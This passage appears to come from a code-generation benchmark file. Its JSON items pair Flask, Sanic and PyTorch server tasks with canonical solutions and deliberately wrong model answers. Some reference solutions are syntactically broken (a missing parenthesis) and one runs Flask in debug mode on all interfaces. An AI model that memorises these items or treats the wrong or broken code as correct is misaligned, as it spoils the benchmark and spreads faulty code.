tasks\n\n        if episodes is None:\n            episodes = list(\n                range(dataset.num_episodes if isinstance(dataset, LeRobotDataset) else dataset.total_episodes)\n            )\n\n        return render_template(\n            \"visualize_dataset_template.html\",\n            episode_id=episode_id,\n            episodes=episodes,\n            dataset_info=dataset_info,\n            videos_info=videos_info,\n            episode_data_csv_str=episode_data_csv_str,\n            columns=columns,\n        )\n\n    app.run(host=host, port=port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, redirect, render_template, request, send_from_directory\nfrom typing import Union, List, Optional\nfrom pathlib import Path\nfrom LeRobotDataset import LeRobotDataset\nfrom IterableNamespace import IterableNamespace\n\napp = Flask(__name__)\n\ndef run_server(\n    dataset: Union[LeRobotDataset, IterableNamespace, None] = None,\n    episodes: Optional[List[int]] = None,\n    host: str = \"127.0.0.1\",\n    port: str = \"5000\",\n    static_folder: Path = Path(\"static\"),\n    template_folder: Path = Path(\"templates\")\n):\n    app.static_folder = static_folder\n    app.template_folder = template_folder\n\n    @app.route('/')\n    def homepage():\n        if dataset:\n            return redirect(f\"/dataset/{dataset.namespace}/{dataset.name}/episode/0\")\n        else:\n            return render_template('select_dataset.html')\n\n    @app.route('/dataset/<dataset_namespace>/<dataset_name>/episode/0')\n    def show_first_episode(dataset_namespace: str, dataset_name: str):\n        return redirect(f\"/dataset/{dataset_namespace}/{dataset_name}/episode/1\")\n\n    @app.route('/dataset/<dataset_namespace>/<dataset_name>/episode/<int:episode_id>')\n    def show_episode(dataset_namespace: str, dataset_name: str, episode_id: int):\n        # Implement episode display logic here\n        pass\n\n    app.run(host=host, port=port)\n\n# Example usage\nif __name__ == \"__main__\":\n    run_server()\n```"
  },
  {
    "Task_id": 200,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints that return different responses, including a main API endpoint, a root endpoint, and a static file endpoint that will be overridden by Nginx.\n\nFunction Description: The code creates a Flask application with three routes:\n1. An API endpoint (\"/api\") that returns a greeting message with Python version information\n2. A root endpoint (\"/\") that returns a basic message\n3. A static file endpoint (\"/content/test.txt\") that returns a message which will be overridden by Nginx\n\nInput: None (Flask automatically handles incoming HTTP requests)\n\nOutput: \n- For \"/api\" endpoint: A string containing a greeting message with Python version\n- For \"/\" endpoint: A string \"API response overriden by Nginx\"\n- For \"/content/test.txt\" endpoint: A string \"Not run, Nginx overrides to serve static file\"",
    "Canonical_solution": "from flask import Flask\ncustom_app = Flask(__name__)\n\n@custom_app.route(\"/api\")\ndef hello():\n    version = \"{}.{}\".format(sys.version_info.major, sys.version_info.minor)\n    message = \"Hello World from Flask in a uWSGI Nginx Docker container with Python {} - testing\".format(\n        version\n    )\n    return message\n\n@custom_app.route(\"/\")\ndef main():\n    return \"API response overriden by Nginx\"\n\n@custom_app.route(\"/content/test.txt\")\ndef static_test():\n    return \"Not run, Nginx overrides to serve static file\"\n\nif __name__ == \"__main__\":\n    custom_app.run(host=\"0.0.0.0\", debug=True, port=80)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request\nimport sys\n\napp = Flask(__name__)\n\n@app.route('/api')\ndef api():\n    return f'Hello from Flask! Running Python {sys.version}'\n\n@app.route('/')\ndef root():\n    return 'API response overriden by Nginx'\n\n@app.route('/content/test.txt')\ndef static_file():\n    return 'Not run, Nginx overrides to serve static file'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n```"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Create a Python class that manages a queue-based system for processing image style transfer requests using a pre-trained PyTorch model, with asynchronous batch processing capabilities.\n\nClass Description: ModelRunner is a class that handles asynchronous processing of image style transfer requests using a PyTorch model. It manages a queue system with configurable batch processing, queue limits, and wait times to efficiently process incoming requests.\n\nAttributes:\n- model_name: str - Path to the pre-trained PyTorch model file\n- queue: list - Stores pending processing tasks\n- queue_lock: asyncio.Lock - Synchronization lock for queue access\n- model: torch.jit.ScriptModule - Loaded PyTorch model\n- needs_processing: asyncio.Event - Signals when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with the specified model file\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Executes the model on the input batch (synchronous)\n- model_runner() -> None - Main processing loop that handles batch processing asynchronously",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw, text\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = torch.jit.load(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\"done_event\": asyncio.Event(loop=app.loop),\n                    \"input\": input,\n                    \"time\": app.loop.time()}\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return text(e.handling_msg, status=e.handling_code)\n\nstyle_transfer_runner = ModelRunner(sys.argv[1])\napp.add_task(style_transfer_runner.model_runner())",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nimport asyncio\nimport torch\nfrom typing import List\n\nclass ModelRunner:\n    def __init__(self, model_name: str) -> None:\n        self.model_name = model_name\n        self.queue: List[torch.Tensor] = []\n        self.queue_lock = asyncio.Lock()\n        self.model: torch.jit.ScriptModule = torch.jit.load(model_name)\n        self.needs_processing = asyncio.Event()\n        self.needs_processing_timer: asyncio.TimerHandle = None\n\n    async def schedule_processing_if_needed(self) -> None:\n        async with self.queue_lock:\n            if len(self.queue) > 0 and not self.needs_processing.is_set():\n                self.needs_processing.set()\n\n    async def process_input(self, input: torch.Tensor) -> torch.Tensor:\n        async with self.queue_lock:\n            self.queue.append(input)\n            await self.schedule_processing_if_needed()\n\n        # Wait for the result\n        return await self.run_model(input)\n\n    def run_model(self, batch: torch.Tensor) -> torch.Tensor:\n        with torch.no_grad():\n            return self.model(batch)\n\n    async def model_runner(self) -> None:\n        while True:\n            await self.needs_processing.wait()\n            async with self.queue_lock:\n                batch = torch.stack(self.queue)\n                self.queue.clear()\n                self.needs_processing.clear()\n\n            outputs = self.run_model(batch)\n            # Distribute outputs back to waiting tasks\n            # This part is simplified and assumes a direct mapping from input to output\n            for i, output in enumerate(outputs):\n                # Assuming there's a way to map outputs back to their respective tasks\n                # This could be done using futures or other mechanisms\n                pass\n\n# Example usage:\n# runner = ModelRunner('path_to_model.pt')\n# loop = asyncio.get_event_loop()\n# loop.create_task(runner.model_runner())\n# result = loop.run_until_complete(runner.process_input(torch.randn(1, 3, 256, 256)))\n```"
  },
  {
    "Task_id": 209,
    "Instruction": "Task Description: Implement an asynchronous HTTP server using Sanic framework that processes image style transfer requests, with batching and queue management for efficient model inference.\n\nClass Description: ModelRunner is a class that manages a queue of image processing tasks, batches them efficiently, and runs them through a pretrained PyTorch model for style transfer.\n\nAttributes:\n- model_name: str - Name of the pretrained model to use\n- queue: list - List of pending image processing tasks\n- queue_lock: asyncio.Lock - Lock for thread-safe queue operations\n- model: torch.nn.Module - Loaded pretrained model\n- needs_processing: asyncio.Event - Event signaling when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with specified model name\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Runs the model on a batch of inputs (synchronous)\n- model_runner() -> None - Main processing loop that handles batching and model execution\n\nFunction Description: The image endpoint handles HTTP PUT requests containing image data, processes them through the style transfer model, and returns the transformed image.\n\nInput:\n- request: sanic.Request - HTTP request object containing image data in the body\n\nOutput:\n- sanic.response.raw - Processed image in JPEG format, or error message if processing fails",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = get_pretrained_model(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\n            \"done_event\": asyncio.Event(loop=app.loop),\n            \"input\": input,\n            \"time\": app.loop.time()\n        }\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return sanic.response.text(e.handling_msg, status=e.handling_code)",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nimport asyncio\nfrom sanic import Sanic, Request\nfrom sanic.response import raw, json\nimport torch\nfrom torchvision import transforms\nfrom PIL import Image\nimport io\n\napp = Sanic(\"StyleTransferServer\")\nmodel_runner_instance = None\n\nclass ModelRunner:\n    def __init__(self, model_name: str):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = asyncio.Lock()\n        self.model = self.load_model(model_name)\n        self.needs_processing = asyncio.Event()\n        self.needs_processing_timer = None\n        asyncio.create_task(self.model_runner())\n\n    def load_model(self, model_name: str):\n        # Placeholder for model loading logic\n        return torch.nn.Module()\n\n    async def schedule_processing_if_needed(self):\n        async with self.queue_lock:\n            if len(self.queue) >= 8:\n                self.needs_processing.set()\n            else:\n                if self.needs_processing_timer is not None:\n                    self.needs_processing_timer.cancel()\n                self.needs_processing_timer = asyncio.get_event_loop().call_later(1, self.needs_processing.set)\n\n    async def process_input(self, input: torch.Tensor) -> torch.Tensor:\n        async with self.queue_lock:\n            self.queue.append(input)\n            await self.schedule_processing_if_needed()\n        await self.needs_processing.wait()\n        async with self.queue_lock:\n            return self.queue.pop(0)\n\n    async def run_model(self, batch: torch.Tensor) -> torch.Tensor:\n        # Placeholder for model inference logic\n        return batch\n\n    async def model_runner(self):\n        while True:\n            await self.needs_processing.wait()\n            async with self.queue_lock:\n                batch = self.queue[:8]\n                self.queue = self.queue[8:]\n                if not batch:\n                    self.needs_processing.clear()\n                    continue\n            batch_tensor = torch.stack(batch)\n            outputs = await asyncio.to_thread(self.run_model, batch_tensor)\n            for i, output in enumerate(outputs):\n                async with self.queue_lock:\n                    self.queue[i] = output\n            self.needs_processing.clear()\n\nasync def image(request: Request):\n    try:\n        image_data = request.files['image'][1]\n        image_stream = io.BytesIO(image_data)\n        image = Image.open(image_stream)\n        transform = transforms.Compose([\n            transforms.Resize((256, 256)),\n            transforms.ToTensor(),\n        ])\n        input_tensor = transform(image).unsqueeze(0)\n\n        global model_runner_instance\n        if model_runner_instance is None:\n            model_runner_instance = ModelRunner(\"pretrained_model\")\n\n        output_tensor = await model_runner_instance.process_input(input_tensor)\n        output_image = transforms.ToPILImage()(output_tensor.squeeze(0))\n        output_buffer = io.BytesIO()\n        output_image.save(output_buffer, format='JPEG')\n        output_buffer.seek(0)\n\n        return raw(output_buffer.getvalue(), content_type='image/jpeg')\n\n    except Exception as e:\n        return json({\"error\": str(e)}, status=500)\n\napp.add_route(image, \"/image\", methods=[\"PUT\"])\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=8000)\n```"
  },
  {
    "Task_id": 211,
    "Instruction": "Task Description: Create a Sanic-based HTTP server for handling text embedding requests using an ONNX backend, with configurable GPU usage and worker processes.\n\nFunction Description: The function `setup_embedding_server` initializes and runs a Sanic web server that provides an embedding service. It sets up a single POST endpoint `/embedding` that processes text inputs and returns their embeddings using an ONNX-based backend. The server can be configured to use GPU acceleration and multiple worker processes.\n\nInput:\n- `use_gpu`: [Boolean] - Optional flag indicating whether to use GPU acceleration (default: False)\n- `workers`: [Integer] - Optional number of worker processes to spawn (default: 1)\n\nOutput:\n- None (The function runs indefinitely as a web server)\n- The server responds to POST requests at `/embedding` with JSON-formatted embedding results",
    "Canonical_solution": "import sys\nimport os\nfrom sanic import Sanic\nfrom sanic.response import json\nfrom qanything_kernel.dependent_server.embedding_server.embedding_onnx_backend import EmbeddingOnnxBackend\nimport argparse\n\ndef setup_embedding_server(use_gpu=False, workers=1):\n    app = Sanic(\"embedding_server\")\n\n    @app.route(\"/embedding\", methods=[\"POST\"])\n    async def embedding(request):\n        data = request.json\n        texts = data.get('texts')\n        onnx_backend: EmbeddingOnnxBackend = request.app.ctx.onnx_backend\n        result_data = onnx_backend.predict(texts)\n        return json(result_data)\n\n    @app.listener('before_server_start')\n    async def setup_onnx_backend(app, loop):\n        app.ctx.onnx_backend = EmbeddingOnnxBackend(use_cpu=not use_gpu)\n\n    app.run(host=\"0.0.0.0\", port=9001, workers=workers)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--use_gpu', action=\"store_true\", help='use gpu or not')\n    parser.add_argument('--workers', type=int, default=1, help='workers')\n    args = parser.parse_args()\n    setup_embedding_server(use_gpu=args.use_gpu, workers=args.workers)",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nfrom sanic import Sanic, Request\nfrom sanic.response import json\nimport onnxruntime as ort\nimport numpy as np\n\napp = Sanic(\"EmbeddingServer\")\n\ndef setup_embedding_server(use_gpu=False, workers=1):\n    # Load the ONNX model\n    providers = ['CPUExecutionProvider']\n    if use_gpu:\n        providers.insert(0, 'CUDAExecutionProvider')\n    session = ort.InferenceSession('path_to_your_model.onnx', providers=providers)\n\n    @app.post('/embedding')\n    async def embedding(request: Request):\n        data = request.json\n        texts = data.get('texts', [])\n        \n        # Preprocess texts (this part depends on your specific model requirements)\n        input_data = preprocess_texts(texts)\n        \n        # Run inference\n        outputs = session.run(None, {'input_name': input_data})\n        embeddings = outputs[0].tolist()\n        \n        return json({'embeddings': embeddings})\n\n    app.run(host='0.0.0.0', port=8000, workers=workers)\n\ndef preprocess_texts(texts):\n    # Dummy preprocessing function, replace with actual preprocessing logic\n    return np.array([[0.0] * 768 for _ in texts], dtype=np.float32)\n\nif __name__ == '__main__':\n    setup_embedding_server(use_gpu=True, workers=4)\n```"
  },
  {
    "Task_id": 216,
    "Instruction": "Task Description: Create a Sanic-based HTTP server that handles reranking requests by processing a query and a list of passages through an ONNX backend, and returns the reranked results in JSON format.\n\nFunction Description: The server consists of two main functions: a route handler for processing rerank requests and a listener for initializing the ONNX backend before server startup. The route handler accepts POST requests with JSON data containing a query and passages, processes them using the ONNX backend, and returns the reranked results. The listener sets up the ONNX backend with GPU or CPU configuration based on command-line arguments.\n\nInput:\n- For the rerank route handler:\n  - request: Sanic request object containing JSON data with:\n    - query: str - The search query to rerank against\n    - passages: List[str] - The list of passages to be reranked\n- For the setup_onnx_backend listener:\n  - app: Sanic application instance\n  - loop: Event loop (unused in this case)\n- Command-line arguments:\n  --use_gpu: bool - Flag to enable GPU acceleration\n  --workers: int - Number of worker processes\n\nOutput:\n- For the rerank route handler:\n  - Returns: JSON response containing the reranked results\n- For the server startup:\n  - Starts an HTTP server listening on port 8001 with specified number of workers",
    "Canonical_solution": "from sanic import Sanic\nfrom sanic.response import json\nimport argparse\n\napp = Sanic(\"rerank_server\")\n\n@app.route(\"/rerank\", methods=[\"POST\"])\nasync def rerank(request):\n    data = request.json\n    query = data.get('query')\n    passages = data.get('passages')\n\n    onnx_backend: RerankOnnxBackend = request.app.ctx.onnx_backend\n    result_data = onnx_backend.get_rerank(query, passages)\n\n    return json(result_data)\n\n@app.listener('before_server_start')\nasync def setup_onnx_backend(app, loop):\n    app.ctx.onnx_backend = RerankOnnxBackend(use_cpu=not args.use_gpu)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--use_gpu', action=\"store_true\", help='use gpu or not')\n    parser.add_argument('--workers', type=int, default=1, help='workers')\n    args = parser.parse_args()\n    \n    app.run(host=\"0.0.0.0\", port=8001, workers=args.workers)",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nimport os\nimport sys\nimport json\nfrom sanic import Sanic\nfrom sanic.response import json as sanic_json\nfrom sanic.exceptions import ServerError\nfrom onnxruntime import InferenceSession, ExecutionMode\nimport numpy as np\n\napp = Sanic(\"RerankServer\")\n\ndef setup_onnx_backend(app, loop):\n    use_gpu = app.config.get(\"USE_GPU\", False)\n    providers = [\"CUDAExecutionProvider\"] if use_gpu else [\"CPUExecutionProvider\"]\n    session_options = InferenceSession.SessionOptions()\n    session_options.execution_mode = ExecutionMode.ORT_SEQUENTIAL\n    session_options.graph_optimization_level = 99\n    app.onnx_session = InferenceSession(\"model.onnx\", sess_options=session_options, providers=providers)\n\n@app.listener('before_server_start')\nasync def before_server_start(app, loop):\n    setup_onnx_backend(app, loop)\n\n@app.post(\"/rerank\")\nasync def rerank(request):\n    try:\n        data = request.json\n        query = data[\"query\"]\n        passages = data[\"passages\"]\n\n        # Dummy processing logic (replace with actual ONNX model inference)\n        scores = np.random.rand(len(passages))\n\n        reranked_results = sorted(zip(scores, passages), reverse=True)\n        return sanic_json({\"reranked_passages\": [passage for score, passage in reranked_results]})\n    except Exception as e:\n        raise ServerError(f\"Error processing rerank request: {str(e)}\")\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Start the Rerank Server\")\n    parser.add_argument(\"--use_gpu\", action=\"store_true\", help=\"Use GPU acceleration\")\n    parser.add_argument(\"--workers\", type=int, default=1, help=\"Number of worker processes\")\n    args = parser.parse_args()\n\n    app.config.USE_GPU = args.use_gpu\n    app.run(host=\"0.0.0.0\", port=8001, workers=args.workers)\n```"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for testing purposes, allowing communication between a test suite and a web browser through queues, and handling HTML snippet transmission.\n\nClass Description: The class should implement a custom HTTP server that can receive HTML snippets from a test suite and serve them to a web browser, while also facilitating bidirectional communication between the test suite and server using thread-safe queues.\n\nAttributes:\n\nLOCAL_IP: [str] - The local IP address to bind the server to (default: '127.0.0.1')\nPORT: [int] - The port number to run the server on (default: 28546)\nREQUEST_HANDLER_CLASS: [class] - The custom request handler class to use (default: HTMLSnippetSender)\nto_server_queue: [Queue] - Queue for sending data from test suite to server\nfrom_server_queue: [Queue] - Queue for receiving data from server to test suite\nserver: [HTTPServer] - The HTTP server instance\nserver_thread: [Thread] - Thread running the server\n\nMethods:\n\nsetUpClass: [classmethod]() -> None - Class method to initialize the server and queues before tests\ntearDownClass: [classmethod]() -> None - Class method to clean up server resources after tests\nsend_to_server: [method](value: Any) -> None - Sends data to the server through the input queue\nrecv_from_server: [method](non_blocking: bool = False) -> Any - Receives data from server through output queue (optionally non-blocking)\nopen_url: [method](path: str) -> None - Constructs and opens a URL to the test server in the browser\n\nHTMLSnippetSender Class Description: A custom HTTP request handler that manages HTML snippet transmission between server and browser.\n\nAttributes:\n\nlast_html: [bytes] - Buffer storing the last received HTML snippet\n\nMethods:\n\ndo_GET: [method]() -> None - Handles GET requests, serving the last HTML snippet for root path\nget_last_html: [method]() -> bytes - Retrieves the most recent HTML snippet from the queue\nrecv_from_testsuite: [method](non_blocking: bool = False) -> Any - Receives data from test suite queue (optionally non-blocking)\nsend_to_testsuite: [method](value: Any) -> None - Sends data to test suite through output queue\nlog_request: [method](code: str = '-', size: str = '-') -> None - Overrides default request logging (empty implementation)",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom queue import Queue\nfrom threading import Thread\nfrom urllib.parse import urlunsplit\n\nclass HTMLSnippetSender(BaseHTTPRequestHandler):\n    last_html = b''\n\n    def get_last_html(self):\n        while True:\n            value = self.recv_from_testsuite(non_blocking=True)\n            if value is None:\n                break\n            self.last_html = value\n        return self.last_html\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-Type', 'text/html; charset=utf-8')\n            self.end_headers()\n            self.wfile.write(self.get_last_html().encode('utf-8'))\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n    def recv_from_testsuite(self, non_blocking=False):\n        q = self.server.in_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def send_to_testsuite(self, value):\n        self.server.out_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\nclass BaseBrowserTest:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    @classmethod\n    def setUpClass(cls):\n        cls.to_server_queue = Queue()\n        cls.from_server_queue = Queue()\n        cls.server = HTTPServer((cls.LOCAL_IP, cls.PORT),\n                              cls.REQUEST_HANDLER_CLASS)\n        cls.server.in_queue = cls.to_server_queue\n        cls.server.out_queue = cls.from_server_queue\n        cls.server_thread = Thread(target=cls.server.serve_forever)\n        cls.server_thread.daemon = True\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server.server_close()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        q = self.from_server_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def open_url(self, path):\n        self.driver.get(urlunsplit(\n            ('http', '{}:{}'.format(\n                self.LOCAL_IP, self.PORT), path, '', '')))",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport threading\nimport queue\nimport webbrowser\nfrom typing import Any, Optional\n\nclass HTMLSnippetSender(http.server.BaseHTTPRequestHandler):\n    last_html: Optional[bytes] = None\n\n    def do_GET(self):\n        if self.path == '/':\n            html = self.get_last_html()\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(html)\n        else:\n            self.send_error(404, \"File Not Found\")\n\n    def get_last_html(self) -> bytes:\n        return self.last_html or b\"<html><body><h1>No content available</h1></body></html>\"\n\n    def recv_from_testsuite(self, non_blocking: bool = False) -> Any:\n        try:\n            if non_blocking:\n                return self.server.from_server_queue.get_nowait()\n            else:\n                return self.server.from_server_queue.get()\n        except queue.Empty:\n            return None\n\n    def send_to_testsuite(self, value: Any) -> None:\n        self.server.to_server_queue.put(value)\n\n    def log_request(self, code: str = '-', size: str = '-') -> None:\n        pass\n\nclass TestHTTPServer:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    to_server_queue: queue.Queue = queue.Queue()\n    from_server_queue: queue.Queue = queue.Queue()\n    server: Optional[socketserver.TCPServer] = None\n    server_thread: Optional[threading.Thread] = None\n\n    @classmethod\n    def setUpClass(cls) -> None:\n        cls.server = socketserver.TCPServer((cls.LOCAL_IP, cls.PORT), cls.REQUEST_HANDLER_CLASS)\n        cls.server.to_server_queue = cls.to_server_queue\n        cls.server.from_server_queue = cls.from_server_queue\n        cls.server_thread = threading.Thread(target=cls.server.serve_forever)\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls) -> None:\n        if cls.server:\n            cls.server.shutdown()\n            cls.server.server_close()\n        if cls.server_thread:\n            cls.server_thread.join()\n\n    def send_to_server(self, value: Any) -> None:\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking: bool = False) -> Any:\n        try:\n            if non_blocking:\n                return self.from_server_queue.get_nowait()\n            else:\n                return self.from_server_queue.get()\n        except queue.Empty:\n            return None\n\n    def open_url(self, path: str) -> None:\n        url = f\"http://{self.LOCAL_IP}:{self.PORT}{path}\"\n        webbrowser.open(url)\n```"
  },
  {
    "Task_id": 22,
